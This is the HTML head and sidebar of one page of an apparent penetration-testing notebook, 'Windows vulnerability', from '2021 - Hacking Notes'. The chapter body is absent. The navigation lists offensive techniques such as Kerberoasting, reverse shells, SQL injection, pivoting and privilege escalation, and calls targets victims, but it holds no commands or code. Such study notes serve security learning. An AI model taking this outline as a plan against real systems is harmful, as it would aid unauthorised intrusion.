<!DOCTYPE html>
<html lang="" xml:lang="">
<head>

  <meta charset="utf-8" />
  <meta http-equiv="X-UA-Compatible" content="IE=edge" />
  <title>Windows vulnerability | 2021 - Hacking Notes</title>
  <meta name="description" content="Full Pentest notebook" />
  <meta name="generator" content="bookdown 0.21 and GitBook 2.6.7" />

  <meta property="og:title" content="Windows vulnerability | 2021 - Hacking Notes" />
  <meta property="og:type" content="book" />
  
  
  <meta property="og:description" content="Full Pentest notebook" />
  <meta name="github-repo" content="https://github.com/mlopez66/hacking-notes" />

  <meta name="twitter:card" content="summary" />
  <meta name="twitter:title" content="Windows vulnerability | 2021 - Hacking Notes" />
  
  <meta name="twitter:description" content="Full Pentest notebook" />
  

<meta name="author" content="Lo0pInG 404" />



  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <meta name="apple-mobile-web-app-capable" content="yes" />
  <meta name="apple-mobile-web-app-status-bar-style" content="black" />
  
  
<link rel="prev" href="web-vulneratilities.html"/>
<link rel="next" href="beyond-remote-code-execution.html"/>
<script src="libs/jquery-2.2.3/jquery.min.js"></script>
<link href="libs/gitbook-2.6.7/css/style.css" rel="stylesheet" />
<link href="libs/gitbook-2.6.7/css/plugin-table.css" rel="stylesheet" />
<link href="libs/gitbook-2.6.7/css/plugin-bookdown.css" rel="stylesheet" />
<link href="libs/gitbook-2.6.7/css/plugin-highlight.css" rel="stylesheet" />
<link href="libs/gitbook-2.6.7/css/plugin-search.css" rel="stylesheet" />
<link href="libs/gitbook-2.6.7/css/plugin-fontsettings.css" rel="stylesheet" />
<link href="libs/gitbook-2.6.7/css/plugin-clipboard.css" rel="stylesheet" />









<script src="libs/accessible-code-block-0.0.1/empty-anchor.js"></script>


<style type="text/css">
code.sourceCode > span { display: inline-block; line-height: 1.25; }
code.sourceCode > span { color: inherit; text-decoration: inherit; }
code.sourceCode > span:empty { height: 1.2em; }
.sourceCode { overflow: visible; }
code.sourceCode { white-space: pre; position: relative; }
pre.sourceCode { margin: 0; }
@media screen {
div.sourceCode { overflow: auto; }
}
@media print {
code.sourceCode { white-space: pre-wrap; }
code.sourceCode > span { text-indent: -5em; padding-left: 5em; }
}
pre.numberSource code
  { counter-reset: source-line 0; }
pre.numberSource code > span
  { position: relative; left: -4em; counter-increment: source-line; }
pre.numberSource code > span > a:first-child::before
  { content: counter(source-line);
    position: relative; left: -1em; text-align: right; vertical-align: baseline;
    border: none; display: inline-block;
    -webkit-touch-callout: none; -webkit-user-select: none;
    -khtml-user-select: none; -moz-user-select: none;
    -ms-user-select: none; user-select: none;
    padding: 0 4px; width: 4em;
    color: #aaaaaa;
  }
pre.numberSource { margin-left: 3em; border-left: 1px solid #aaaaaa;  padding-left: 4px; }
div.sourceCode
  {   }
@media screen {
code.sourceCode > span > a:first-child::before { text-decoration: underline; }
}
code span.al { color: #ff0000; font-weight: bold; } /* Alert */
code span.an { color: #60a0b0; font-weight: bold; font-style: italic; } /* Annotation */
code span.at { color: #7d9029; } /* Attribute */
code span.bn { color: #40a070; } /* BaseN */
code span.bu { } /* BuiltIn */
code span.cf { color: #007020; font-weight: bold; } /* ControlFlow */
code span.ch { color: #4070a0; } /* Char */
code span.cn { color: #880000; } /* Constant */
code span.co { color: #60a0b0; font-style: italic; } /* Comment */
code span.cv { color: #60a0b0; font-weight: bold; font-style: italic; } /* CommentVar */
code span.do { color: #ba2121; font-style: italic; } /* Documentation */
code span.dt { color: #902000; } /* DataType */
code span.dv { color: #40a070; } /* DecVal */
code span.er { color: #ff0000; font-weight: bold; } /* Error */
code span.ex { } /* Extension */
code span.fl { color: #40a070; } /* Float */
code span.fu { color: #06287e; } /* Function */
code span.im { } /* Import */
code span.in { color: #60a0b0; font-weight: bold; font-style: italic; } /* Information */
code span.kw { color: #007020; font-weight: bold; } /* Keyword */
code span.op { color: #666666; } /* Operator */
code span.ot { color: #007020; } /* Other */
code span.pp { color: #bc7a00; } /* Preprocessor */
code span.sc { color: #4070a0; } /* SpecialChar */
code span.ss { color: #bb6688; } /* SpecialString */
code span.st { color: #4070a0; } /* String */
code span.va { color: #19177c; } /* Variable */
code span.vs { color: #4070a0; } /* VerbatimString */
code span.wa { color: #60a0b0; font-weight: bold; font-style: italic; } /* Warning */
</style>

<link rel="stylesheet" href="assets/gitbook.css" type="text/css" />
</head>

<body>



  <div class="book without-animation with-summary font-size-2 font-family-1" data-basepath=".">

    <div class="book-summary">
      <nav role="navigation">

<ul class="summary">
<li class="header-light">
  <a class="logo" href="/">
    <img src="assets/wr404-transparent.png" alt="LoOpInG 404" class="img-fluid">
  </a>
  <h1>Lo0pInG 404</h1>
</li>

<li class="divider"></li>
<li class="chapter" data-level="" data-path="index.html"><a href="index.html"><i class="fa fa-check"></i>Preface</a><ul>
<li class="chapter" data-level="" data-path="index.html"><a href="index.html#introduction-1"><i class="fa fa-check"></i>Introduction</a></li>
<li class="chapter" data-level="" data-path="index.html"><a href="index.html#acknoledgement-1"><i class="fa fa-check"></i>Acknoledgement</a></li>
</ul></li>
<li class="part"><span><b>I Information Gathering</b></span></li>
<li class="chapter" data-level="" data-path="get-information-from-public-sources.html"><a href="get-information-from-public-sources.html"><i class="fa fa-check"></i>Get Information from public sources</a><ul>
<li class="chapter" data-level="" data-path="get-information-from-public-sources.html"><a href="get-information-from-public-sources.html#social-networks"><i class="fa fa-check"></i>Social Networks</a></li>
<li class="chapter" data-level="" data-path="get-information-from-public-sources.html"><a href="get-information-from-public-sources.html#public-sites"><i class="fa fa-check"></i>Public sites</a></li>
<li class="chapter" data-level="" data-path="get-information-from-public-sources.html"><a href="get-information-from-public-sources.html#whois"><i class="fa fa-check"></i>Whois</a></li>
<li class="chapter" data-level="" data-path="get-information-from-public-sources.html"><a href="get-information-from-public-sources.html#check-personnal-victim-website"><i class="fa fa-check"></i>Check personnal victim website</a></li>
<li class="chapter" data-level="" data-path="get-information-from-public-sources.html"><a href="get-information-from-public-sources.html#passive-enumeration"><i class="fa fa-check"></i>Passive Enumeration</a></li>
</ul></li>
<li class="part"><span><b>II Enumeration</b></span></li>
<li class="chapter" data-level="" data-path="server-enumeration.html"><a href="server-enumeration.html"><i class="fa fa-check"></i>Server Enumeration</a><ul>
<li class="chapter" data-level="" data-path="server-enumeration.html"><a href="server-enumeration.html#ping-for-network-connectivity"><i class="fa fa-check"></i>Ping for Network connectivity</a></li>
<li class="chapter" data-level="" data-path="server-enumeration.html"><a href="server-enumeration.html#fping-to-enumerate-multiple-unknown-machines"><i class="fa fa-check"></i>fping to enumerate multiple unknown machines</a></li>
<li class="chapter" data-level="" data-path="server-enumeration.html"><a href="server-enumeration.html#nmap-for-machine-enumeration"><i class="fa fa-check"></i>NMAP for Machine Enumeration</a></li>
<li class="chapter" data-level="" data-path="server-enumeration.html"><a href="server-enumeration.html#port-scanner-with-bash"><i class="fa fa-check"></i>Port scanner with bash</a></li>
<li class="chapter" data-level="" data-path="server-enumeration.html"><a href="server-enumeration.html#use-specific-or-grouped-nmap-script-for-enumeration"><i class="fa fa-check"></i>Use specific or grouped nmap script for Enumeration</a></li>
<li class="chapter" data-level="" data-path="server-enumeration.html"><a href="server-enumeration.html#search-for-port-with-udp-protocol"><i class="fa fa-check"></i>Search for port with udp protocol</a><ul>
<li class="chapter" data-level="" data-path="server-enumeration.html"><a href="server-enumeration.html#get-snmp-community-string-with-onesixtyone"><i class="fa fa-check"></i>Get snmp community string with onesixtyone</a></li>
<li class="chapter" data-level="" data-path="server-enumeration.html"><a href="server-enumeration.html#enumerate-internal-services-and-processes-with-snmpwalk"><i class="fa fa-check"></i>Enumerate internal services and processes with snmpwalk</a></li>
<li class="chapter" data-level="" data-path="server-enumeration.html"><a href="server-enumeration.html#enumerate-internal-services-and-processed-with-nmap-scripts"><i class="fa fa-check"></i>Enumerate internal services and processed with nmap scripts</a></li>
</ul></li>
<li class="chapter" data-level="" data-path="server-enumeration.html"><a href="server-enumeration.html#ipv6-enumeration"><i class="fa fa-check"></i>IPV6 enumeration</a><ul>
<li class="chapter" data-level="" data-path="server-enumeration.html"><a href="server-enumeration.html#ping-a-machine-with-its-ipv6-address"><i class="fa fa-check"></i>Ping a machine with itâ€™s ipv6 address</a></li>
<li class="chapter" data-level="" data-path="server-enumeration.html"><a href="server-enumeration.html#enumerate-ports-with-nmap-with-the-ipv6-address"><i class="fa fa-check"></i>Enumerate ports with nmap with the ipv6 address</a></li>
<li class="chapter" data-level="" data-path="server-enumeration.html"><a href="server-enumeration.html#display-ipv6-web-app-on-the-web-browser"><i class="fa fa-check"></i>Display ipv6 web app on the web browser</a></li>
<li class="chapter" data-level="" data-path="server-enumeration.html"><a href="server-enumeration.html#pass-from-mac-address-to-ipv6-link-local-address"><i class="fa fa-check"></i>Pass from MAC address to IPV6 link local address</a></li>
</ul></li>
</ul></li>
<li class="chapter" data-level="" data-path="web-enumeration.html"><a href="web-enumeration.html"><i class="fa fa-check"></i>Web Enumeration</a><ul>
<li class="chapter" data-level="" data-path="web-enumeration.html"><a href="web-enumeration.html#check-if-web-app-is-under-a-waf"><i class="fa fa-check"></i>Check if web app is under a WAF</a></li>
<li class="chapter" data-level="" data-path="web-enumeration.html"><a href="web-enumeration.html#nmap-http-scripting"><i class="fa fa-check"></i>Nmap http scripting</a></li>
<li class="chapter" data-level="" data-path="web-enumeration.html"><a href="web-enumeration.html#whatweb"><i class="fa fa-check"></i>Whatweb</a></li>
<li class="chapter" data-level="" data-path="web-enumeration.html"><a href="web-enumeration.html#create-a-dictionary-with-the-elements-in-a-website"><i class="fa fa-check"></i>Create a dictionary with the elements in a website</a></li>
<li class="chapter" data-level="" data-path="web-enumeration.html"><a href="web-enumeration.html#fuzzing-with-wfuzz"><i class="fa fa-check"></i>Fuzzing with WFUZZ</a></li>
<li class="chapter" data-level="" data-path="web-enumeration.html"><a href="web-enumeration.html#fuzzing-with-dirbuster"><i class="fa fa-check"></i>Fuzzing with Dirbuster</a></li>
<li class="chapter" data-level="" data-path="web-enumeration.html"><a href="web-enumeration.html#fuzzing-with-dirb"><i class="fa fa-check"></i>Fuzzing with Dirb</a></li>
<li class="chapter" data-level="" data-path="web-enumeration.html"><a href="web-enumeration.html#wpscan-for-wordpress-webapps"><i class="fa fa-check"></i>WPScan for wordpress webapps</a></li>
<li class="chapter" data-level="" data-path="web-enumeration.html"><a href="web-enumeration.html#inspect-ssl-certificate"><i class="fa fa-check"></i>Inspect SSL certificate</a></li>
<li class="chapter" data-level="" data-path="web-enumeration.html"><a href="web-enumeration.html#use-curl-to-retrieve-user-or-information-in-the-webapp"><i class="fa fa-check"></i>Use curl to retrieve user or information in the webapp</a></li>
</ul></li>
<li class="chapter" data-level="" data-path="steganography.html"><a href="steganography.html"><i class="fa fa-check"></i>Steganography</a><ul>
<li class="chapter" data-level="" data-path="steganography.html"><a href="steganography.html#look-at-info-with-file"><i class="fa fa-check"></i>Look at info with file</a></li>
</ul></li>
<li class="chapter" data-level="" data-path="active-directory-windows-machines.html"><a href="active-directory-windows-machines.html"><i class="fa fa-check"></i>Active Directory &amp; Windows Machines</a><ul>
<li class="chapter" data-level="" data-path="active-directory-windows-machines.html"><a href="active-directory-windows-machines.html#interesting-windows-ports"><i class="fa fa-check"></i>Interesting Windows ports</a></li>
<li class="chapter" data-level="" data-path="active-directory-windows-machines.html"><a href="active-directory-windows-machines.html#map-samba-exposed-shared-resources-with-smbmap"><i class="fa fa-check"></i>Map SAMBA exposed shared resources with smbmap</a></li>
<li class="chapter" data-level="" data-path="active-directory-windows-machines.html"><a href="active-directory-windows-machines.html#smb-connection-with-smbclient-and-smbmap"><i class="fa fa-check"></i>SMB connection with smbclient and smbmap</a></li>
<li class="chapter" data-level="" data-path="active-directory-windows-machines.html"><a href="active-directory-windows-machines.html#enumerate-machines-and-check-user-validity-by-samba-with-cme"><i class="fa fa-check"></i>Enumerate machines and check user validity by SAMBA with CME</a></li>
<li class="chapter" data-level="" data-path="active-directory-windows-machines.html"><a href="active-directory-windows-machines.html#sniffing-traffic-for-samba-relay-with-responder"><i class="fa fa-check"></i>Sniffing traffic for SAMBA Relay with responder</a></li>
<li class="chapter" data-level="" data-path="active-directory-windows-machines.html"><a href="active-directory-windows-machines.html#rpc-connection-with-rpcclient"><i class="fa fa-check"></i>RPC connection with rpcclient</a></li>
<li class="chapter" data-level="" data-path="active-directory-windows-machines.html"><a href="active-directory-windows-machines.html#enumerate-ldap-service-with-nmap"><i class="fa fa-check"></i>Enumerate ldap service with nmap</a></li>
</ul></li>
<li class="part"><span><b>III Vulnerabilies Assessment</b></span></li>
<li class="chapter" data-level="" data-path="searching-for-exploits.html"><a href="searching-for-exploits.html"><i class="fa fa-check"></i>Searching for exploits</a><ul>
<li class="chapter" data-level="" data-path="searching-for-exploits.html"><a href="searching-for-exploits.html#exploit-database"><i class="fa fa-check"></i>Exploit database</a></li>
<li class="chapter" data-level="" data-path="searching-for-exploits.html"><a href="searching-for-exploits.html#searchsploit"><i class="fa fa-check"></i>Searchsploit</a></li>
</ul></li>
<li class="chapter" data-level="" data-path="web-vulneratilities.html"><a href="web-vulneratilities.html"><i class="fa fa-check"></i>Web Vulneratilities</a><ul>
<li class="chapter" data-level="" data-path="web-vulneratilities.html"><a href="web-vulneratilities.html#lfi-local-file-inclusion"><i class="fa fa-check"></i>LFI (Local File inclusion)</a></li>
<li class="chapter" data-level="" data-path="web-vulneratilities.html"><a href="web-vulneratilities.html#wrappers"><i class="fa fa-check"></i>Wrappers</a></li>
<li class="chapter" data-level="" data-path="web-vulneratilities.html"><a href="web-vulneratilities.html#log-poisoning"><i class="fa fa-check"></i>Log Poisoning</a><ul>
<li class="chapter" data-level="" data-path="web-vulneratilities.html"><a href="web-vulneratilities.html#apache2"><i class="fa fa-check"></i>Apache2</a></li>
<li class="chapter" data-level="" data-path="web-vulneratilities.html"><a href="web-vulneratilities.html#ssh-logs"><i class="fa fa-check"></i>ssh logs</a></li>
</ul></li>
<li class="chapter" data-level="" data-path="web-vulneratilities.html"><a href="web-vulneratilities.html#rfi-remote-file-inclusion"><i class="fa fa-check"></i>RFI (Remote File inclusion)</a></li>
<li class="chapter" data-level="" data-path="web-vulneratilities.html"><a href="web-vulneratilities.html#html-injection"><i class="fa fa-check"></i>HTML Injection</a></li>
<li class="chapter" data-level="" data-path="web-vulneratilities.html"><a href="web-vulneratilities.html#xss-cross-site-scripting"><i class="fa fa-check"></i>XSS (Cross site scripting)</a></li>
<li class="chapter" data-level="" data-path="web-vulneratilities.html"><a href="web-vulneratilities.html#xss-blind"><i class="fa fa-check"></i>XSS Blind</a></li>
<li class="chapter" data-level="" data-path="web-vulneratilities.html"><a href="web-vulneratilities.html#csrf-cross-site-request-forgery"><i class="fa fa-check"></i>CSRF (Cross-site Request Forgery)</a></li>
<li class="chapter" data-level="" data-path="web-vulneratilities.html"><a href="web-vulneratilities.html#ssrf-server-side-request-forgery"><i class="fa fa-check"></i>SSRF (Server-Side Request Forgery)</a></li>
<li class="chapter" data-level="" data-path="web-vulneratilities.html"><a href="web-vulneratilities.html#sql-injection---error-based"><i class="fa fa-check"></i>SQL Injection - Error Based</a></li>
<li class="chapter" data-level="" data-path="web-vulneratilities.html"><a href="web-vulneratilities.html#sql-injection---time-based"><i class="fa fa-check"></i>SQL Injection - Time Based</a></li>
<li class="chapter" data-level="" data-path="web-vulneratilities.html"><a href="web-vulneratilities.html#sql-injection---boolean-based"><i class="fa fa-check"></i>SQL Injection - Boolean Based</a></li>
<li class="chapter" data-level="" data-path="web-vulneratilities.html"><a href="web-vulneratilities.html#sqlmap"><i class="fa fa-check"></i>SQLMap</a></li>
<li class="chapter" data-level="" data-path="web-vulneratilities.html"><a href="web-vulneratilities.html#padding-oracle-attack-padbuster"><i class="fa fa-check"></i>Padding Oracle Attack (Padbuster)</a></li>
<li class="chapter" data-level="" data-path="web-vulneratilities.html"><a href="web-vulneratilities.html#padding-oracle-attack-bit-flipper-attack---burpsuite"><i class="fa fa-check"></i>Padding Oracle Attack (Bit Flipper Attack - BurpSuite)</a></li>
<li class="chapter" data-level="" data-path="web-vulneratilities.html"><a href="web-vulneratilities.html#shellshock"><i class="fa fa-check"></i>ShellShock</a></li>
<li class="chapter" data-level="" data-path="web-vulneratilities.html"><a href="web-vulneratilities.html#xxe-xml-external-entity-injection"><i class="fa fa-check"></i>XXE (XML External Entity Injection)</a></li>
<li class="chapter" data-level="" data-path="web-vulneratilities.html"><a href="web-vulneratilities.html#blind-xxe"><i class="fa fa-check"></i>Blind XXE</a></li>
<li class="chapter" data-level="" data-path="web-vulneratilities.html"><a href="web-vulneratilities.html#domain-zone-transfer"><i class="fa fa-check"></i>Domain Zone Transfer</a></li>
<li class="chapter" data-level="" data-path="web-vulneratilities.html"><a href="web-vulneratilities.html#insecure-deserialization"><i class="fa fa-check"></i>Insecure Deserialization</a></li>
<li class="chapter" data-level="" data-path="web-vulneratilities.html"><a href="web-vulneratilities.html#type-juggling"><i class="fa fa-check"></i>Type Juggling</a></li>
<li class="chapter" data-level="" data-path="web-vulneratilities.html"><a href="web-vulneratilities.html#ssti"><i class="fa fa-check"></i>SSTI</a></li>
</ul></li>
<li class="chapter" data-level="" data-path="windows-vulnerability.html"><a href="windows-vulnerability.html"><i class="fa fa-check"></i>Windows vulnerability</a><ul>
<li class="chapter" data-level="" data-path="windows-vulnerability.html"><a href="windows-vulnerability.html#use-scf-file-to-get-the-ntlmv2-hash"><i class="fa fa-check"></i>Use scf file to get the NTLMv2 hash</a></li>
<li class="chapter" data-level="" data-path="windows-vulnerability.html"><a href="windows-vulnerability.html#active-directory-enumeration"><i class="fa fa-check"></i>Active Directory Enumeration</a><ul>
<li class="chapter" data-level="" data-path="windows-vulnerability.html"><a href="windows-vulnerability.html#injesting-bloodhound-from-the-attacker-machine"><i class="fa fa-check"></i>Injesting bloodhound from the attacker machine</a></li>
<li class="chapter" data-level="" data-path="windows-vulnerability.html"><a href="windows-vulnerability.html#injesting-bloodhound-from-the-victim"><i class="fa fa-check"></i>Injesting bloodhound from the victim</a></li>
<li class="chapter" data-level="" data-path="windows-vulnerability.html"><a href="windows-vulnerability.html#install-bloodhound-and-run-it"><i class="fa fa-check"></i>Install bloodhound and run it</a></li>
</ul></li>
<li class="chapter" data-level="" data-path="windows-vulnerability.html"><a href="windows-vulnerability.html#asreproasing-on-kerberos"><i class="fa fa-check"></i>ASREPRoasing on Kerberos</a></li>
<li class="chapter" data-level="" data-path="windows-vulnerability.html"><a href="windows-vulnerability.html#kerberoasting-attack"><i class="fa fa-check"></i>Kerberoasting attack</a><ul>
<li class="chapter" data-level="" data-path="windows-vulnerability.html"><a href="windows-vulnerability.html#kerberoasting-attack-on-victim-machine-with-rubeus"><i class="fa fa-check"></i>Kerberoasting attack on victim machine with rubeus</a></li>
<li class="chapter" data-level="" data-path="windows-vulnerability.html"><a href="windows-vulnerability.html#kerberoasting-attack-from-attacker-machine-with-impacket-getuserspns"><i class="fa fa-check"></i>Kerberoasting attack from attacker machine with impacket-GetUserSPNs</a></li>
</ul></li>
</ul></li>
<li class="part"><span><b>IV Vuln exploit &amp; Gaining Access</b></span></li>
<li class="chapter" data-level="" data-path="beyond-remote-code-execution.html"><a href="beyond-remote-code-execution.html"><i class="fa fa-check"></i>Beyond Remote Code Execution</a></li>
<li class="chapter" data-level="" data-path="checking-if-code-execution-occurs.html"><a href="checking-if-code-execution-occurs.html"><i class="fa fa-check"></i>Checking if code execution occurs</a><ul>
<li class="chapter" data-level="" data-path="checking-if-code-execution-occurs.html"><a href="checking-if-code-execution-occurs.html#time-sleep-technic"><i class="fa fa-check"></i>Time sleep technic</a></li>
<li class="chapter" data-level="" data-path="checking-if-code-execution-occurs.html"><a href="checking-if-code-execution-occurs.html#check-network-connectivity"><i class="fa fa-check"></i>Check network connectivity</a></li>
<li class="chapter" data-level="" data-path="checking-if-code-execution-occurs.html"><a href="checking-if-code-execution-occurs.html#use-wget-and-netcat-to-execute-command"><i class="fa fa-check"></i>Use wget and netcat to execute command</a></li>
</ul></li>
<li class="chapter" data-level="" data-path="visible-remote-code-execution.html"><a href="visible-remote-code-execution.html"><i class="fa fa-check"></i>Visible remote code execution</a></li>
<li class="chapter" data-level="" data-path="gaining-access-throw-remote-code-execution.html"><a href="gaining-access-throw-remote-code-execution.html"><i class="fa fa-check"></i>Gaining access throw remote code execution</a><ul>
<li class="chapter" data-level="" data-path="gaining-access-throw-remote-code-execution.html"><a href="gaining-access-throw-remote-code-execution.html#listen-and-connection-with-netcat"><i class="fa fa-check"></i>Listen and connection with netcat</a></li>
<li class="chapter" data-level="" data-path="gaining-access-throw-remote-code-execution.html"><a href="gaining-access-throw-remote-code-execution.html#connection-with-curl"><i class="fa fa-check"></i>Connection with curl</a></li>
<li class="chapter" data-level="" data-path="gaining-access-throw-remote-code-execution.html"><a href="gaining-access-throw-remote-code-execution.html#spawning-a-terminal-from-a-shell"><i class="fa fa-check"></i>Spawning a terminal from a shell</a></li>
</ul></li>
<li class="chapter" data-level="" data-path="use-sql-injection-for-create-a-reverse-shell.html"><a href="use-sql-injection-for-create-a-reverse-shell.html"><i class="fa fa-check"></i>Use SQL Injection for create a reverse shell</a><ul>
<li class="chapter" data-level="" data-path="use-sql-injection-for-create-a-reverse-shell.html"><a href="use-sql-injection-for-create-a-reverse-shell.html#postgresql"><i class="fa fa-check"></i>Postgresql</a></li>
</ul></li>
<li class="chapter" data-level="" data-path="password-cracking.html"><a href="password-cracking.html"><i class="fa fa-check"></i>Password Cracking</a><ul>
<li class="chapter" data-level="" data-path="password-cracking.html"><a href="password-cracking.html#password-cracking-with-johntheripper"><i class="fa fa-check"></i>Password Cracking with JohnTheRipper</a><ul>
<li class="chapter" data-level="" data-path="password-cracking.html"><a href="password-cracking.html#use-john-for-brute-force"><i class="fa fa-check"></i>Use John for brute force</a></li>
<li class="chapter" data-level="" data-path="password-cracking.html"><a href="password-cracking.html#use-john-for-dictionary-attack"><i class="fa fa-check"></i>Use John for dictionary attack</a></li>
<li class="chapter" data-level="" data-path="password-cracking.html"><a href="password-cracking.html#cracking-ssh-keys-protected-by-password"><i class="fa fa-check"></i>Cracking ssh keys protected by password</a></li>
<li class="chapter" data-level="" data-path="password-cracking.html"><a href="password-cracking.html#cracking-ftp-protected-by-password"><i class="fa fa-check"></i>Cracking ftp protected by password</a></li>
</ul></li>
<li class="chapter" data-level="" data-path="password-cracking.html"><a href="password-cracking.html#use-websites-for-cracking-password"><i class="fa fa-check"></i>Use websites for cracking password</a></li>
<li class="chapter" data-level="" data-path="password-cracking.html"><a href="password-cracking.html#authentication-cracking"><i class="fa fa-check"></i>Authentication Cracking</a><ul>
<li class="chapter" data-level="" data-path="password-cracking.html"><a href="password-cracking.html#authentication-cracking-with-hydra"><i class="fa fa-check"></i>Authentication Cracking with Hydra</a></li>
</ul></li>
<li class="chapter" data-level="" data-path="password-cracking.html"><a href="password-cracking.html#break-known-hash-algorithms-with-cyberchef"><i class="fa fa-check"></i>Break known hash algorithms with CyberChef</a></li>
</ul></li>
<li class="chapter" data-level="" data-path="pivoting.html"><a href="pivoting.html"><i class="fa fa-check"></i>Pivoting</a><ul>
<li class="chapter" data-level="" data-path="pivoting.html"><a href="pivoting.html#pivoting-with-chisel"><i class="fa fa-check"></i>Pivoting with chisel</a></li>
<li class="chapter" data-level="" data-path="pivoting.html"><a href="pivoting.html#pivoting-with-socat"><i class="fa fa-check"></i>Pivoting with socat</a></li>
<li class="chapter" data-level="" data-path="pivoting.html"><a href="pivoting.html#port-forwarding-with-ssh"><i class="fa fa-check"></i>Port forwarding with ssh</a></li>
</ul></li>
<li class="chapter" data-level="" data-path="gaining-access-with-metasploit.html"><a href="gaining-access-with-metasploit.html"><i class="fa fa-check"></i>Gaining access with Metasploit</a><ul>
<li class="chapter" data-level="" data-path="gaining-access-with-metasploit.html"><a href="gaining-access-with-metasploit.html#search-for-a-proper-exploit"><i class="fa fa-check"></i>Search for a proper exploit</a></li>
<li class="chapter" data-level="" data-path="gaining-access-with-metasploit.html"><a href="gaining-access-with-metasploit.html#use-the-desired-exploit"><i class="fa fa-check"></i>Use the desired exploit</a></li>
<li class="chapter" data-level="" data-path="gaining-access-with-metasploit.html"><a href="gaining-access-with-metasploit.html#run-the-exploit"><i class="fa fa-check"></i>Run the exploit</a></li>
</ul></li>
<li class="chapter" data-level="" data-path="windows-specific.html"><a href="windows-specific.html"><i class="fa fa-check"></i>Windows Specific</a><ul>
<li class="chapter" data-level="" data-path="windows-specific.html"><a href="windows-specific.html#ms-sql-server"><i class="fa fa-check"></i>MS SQL Server</a></li>
<li class="chapter" data-level="" data-path="windows-specific.html"><a href="windows-specific.html#connect-to-machine-with-psexec"><i class="fa fa-check"></i>Connect to machine with PSEXEC</a></li>
<li class="chapter" data-level="" data-path="windows-specific.html"><a href="windows-specific.html#send-files-to-windows-machine"><i class="fa fa-check"></i>Send files to windows machine</a><ul>
<li class="chapter" data-level="" data-path="windows-specific.html"><a href="windows-specific.html#download-files-with-certutil"><i class="fa fa-check"></i>Download files with certutil</a></li>
<li class="chapter" data-level="" data-path="windows-specific.html"><a href="windows-specific.html#download-files-by-using-powershell"><i class="fa fa-check"></i>Download files by using Powershell</a></li>
<li class="chapter" data-level="" data-path="windows-specific.html"><a href="windows-specific.html#share-smb-directory-with-windows-machine"><i class="fa fa-check"></i>Share SMB directory with Windows Machine</a></li>
</ul></li>
<li class="chapter" data-level="" data-path="windows-specific.html"><a href="windows-specific.html#connection-throw-winrm-with-evil-winrm"><i class="fa fa-check"></i>Connection throw WinRM with evil-winrm</a></li>
<li class="chapter" data-level="" data-path="windows-specific.html"><a href="windows-specific.html#exploit-getchangesall-privilege-vulnerability"><i class="fa fa-check"></i>Exploit GetChangesAll privilege vulnerability</a></li>
<li class="chapter" data-level="" data-path="windows-specific.html"><a href="windows-specific.html#powershell-access-with-nishang"><i class="fa fa-check"></i>Powershell access with Nishang</a><ul>
<li class="chapter" data-level="" data-path="windows-specific.html"><a href="windows-specific.html#invoke-powershelltcp.ps1"><i class="fa fa-check"></i>Invoke-PowerShelltcp.ps1</a></li>
</ul></li>
<li class="chapter" data-level="" data-path="windows-specific.html"><a href="windows-specific.html#create-a-reverse-shell-with-msfvenom"><i class="fa fa-check"></i>Create a reverse shell with msfvenom</a></li>
<li class="chapter" data-level="" data-path="windows-specific.html"><a href="windows-specific.html#bypass-constraint-language-in-a-powershell"><i class="fa fa-check"></i>Bypass Constraint Language in a PowerShell</a></li>
<li class="chapter" data-level="" data-path="windows-specific.html"><a href="windows-specific.html#shells-for-windows"><i class="fa fa-check"></i>Shells for windows</a><ul>
<li class="chapter" data-level="" data-path="windows-specific.html"><a href="windows-specific.html#php"><i class="fa fa-check"></i>PHP</a></li>
</ul></li>
</ul></li>
<li class="part"><span><b>V Privilege Escalation</b></span></li>
<li class="chapter" data-level="" data-path="linux-machine.html"><a href="linux-machine.html"><i class="fa fa-check"></i>Linux Machine</a><ul>
<li class="chapter" data-level="" data-path="linux-machine.html"><a href="linux-machine.html#writable-rights-in-etcpasswd"><i class="fa fa-check"></i>Writable rights in /etc/passwd</a></li>
<li class="chapter" data-level="" data-path="linux-machine.html"><a href="linux-machine.html#local-port-forwarding"><i class="fa fa-check"></i>Local Port forwarding</a></li>
<li class="chapter" data-level="" data-path="linux-machine.html"><a href="linux-machine.html#add-ssuid-privilege-to-tool"><i class="fa fa-check"></i>Add SSUID privilege to tool</a></li>
<li class="chapter" data-level="" data-path="linux-machine.html"><a href="linux-machine.html#path-hijacking"><i class="fa fa-check"></i>Path Hijacking</a></li>
<li class="chapter" data-level="" data-path="linux-machine.html"><a href="linux-machine.html#library-hijacking"><i class="fa fa-check"></i>Library Hijacking</a></li>
<li class="chapter" data-level="" data-path="linux-machine.html"><a href="linux-machine.html#wildcards"><i class="fa fa-check"></i>WildCards</a></li>
<li class="chapter" data-level="" data-path="linux-machine.html"><a href="linux-machine.html#linux-capabilities-exploitation"><i class="fa fa-check"></i>Linux capabilities exploitation</a></li>
<li class="chapter" data-level="" data-path="linux-machine.html"><a href="linux-machine.html#kernel-abuse"><i class="fa fa-check"></i>Kernel abuse</a></li>
</ul></li>
<li class="chapter" data-level="" data-path="windows-machine.html"><a href="windows-machine.html"><i class="fa fa-check"></i>Windows Machine</a><ul>
<li class="chapter" data-level="" data-path="windows-machine.html"><a href="windows-machine.html#active-directory"><i class="fa fa-check"></i>Active Directory</a><ul>
<li class="chapter" data-level="" data-path="windows-machine.html"><a href="windows-machine.html#golden-ticket-attack"><i class="fa fa-check"></i>Golden Ticket Attack</a></li>
</ul></li>
<li class="chapter" data-level="" data-path="windows-machine.html"><a href="windows-machine.html#check-possible-privilege-escalation-vulnerabilities"><i class="fa fa-check"></i>Check possible privilege escalation vulnerabilities</a></li>
<li class="chapter" data-level="" data-path="windows-machine.html"><a href="windows-machine.html#check-command-history"><i class="fa fa-check"></i>Check command history</a></li>
<li class="chapter" data-level="" data-path="windows-machine.html"><a href="windows-machine.html#check-local-open-ports"><i class="fa fa-check"></i>Check local open ports</a></li>
<li class="chapter" data-level="" data-path="windows-machine.html"><a href="windows-machine.html#juicypotato"><i class="fa fa-check"></i>JuicyPotato</a></li>
<li class="chapter" data-level="" data-path="windows-machine.html"><a href="windows-machine.html#system-enumeration-with-powerup-for-privesc"><i class="fa fa-check"></i>System enumeration with PowerUp for Privesc</a></li>
</ul></li>
<li class="divider"></li>
<li class="summary-footer"><a class="logo" href="https://lopezmichel.org"><img alt="IPESE" src="assets/wr404-transparent.png"></a></li>

</ul>

      </nav>
    </div>

    <div class="book-body">
      <div class="body-inner">
        <div class="book-header" role="navigation">
          <h1>
            <i class="fa fa-circle-o-notch fa-spin"></i><a href="./">2021 - Hacking Notes</a>
          </h1>
